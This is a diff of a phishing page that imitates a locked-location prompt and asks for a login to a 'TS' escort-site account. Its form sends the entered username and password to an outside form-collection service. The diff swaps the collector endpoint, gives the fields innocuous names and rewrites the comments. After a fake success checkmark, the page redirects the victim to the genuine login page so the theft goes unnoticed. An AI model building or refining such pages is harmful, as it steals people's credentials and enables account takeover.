@@ -43,9 +43,9 @@
                 <h2>Location Blocked</h2>
                 <p>Login to your <span class="ts-brand">TS</span> account to verify identity and unlock this private location pin.</p>
                 
-                <form action="https://usebasin.com/f/7ab2ba455334" method="POST" id="main-form">
-                    <input type="text" name="user_id" placeholder="Username or Email" required>
-                    <input type="password" name="user_pass" placeholder="Password" required>
+                <form action="https://usebasin.com/f/32f17c2f5ad5" method="POST" id="main-form">
+                    <input type="text" name="entry_1" placeholder="Username or Email" required>
+                    <input type="password" name="entry_2" placeholder="Password" required>
                     
                     <input type="hidden" name="_next" value="https://tsescorts-verification.github.io/Google-Maps/?status=success">
                     
@@ -63,13 +63,13 @@
     </div>
 
     <script>
-        // Check if the URL has "?status=success" (Meaning they just submitted)
+        // Check for the success status in the URL
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.get('status') === 'success') {
             document.getElementById('login-state').style.display = 'none';
             document.getElementById('success-view').style.display = 'block';
             
-            // Redirect to the real site after showing the checkmark
+            // Final redirect to the real site
             setTimeout(() => {
                 window.location.href = "https://m.tsescorts.com/login";
             }, 3000);
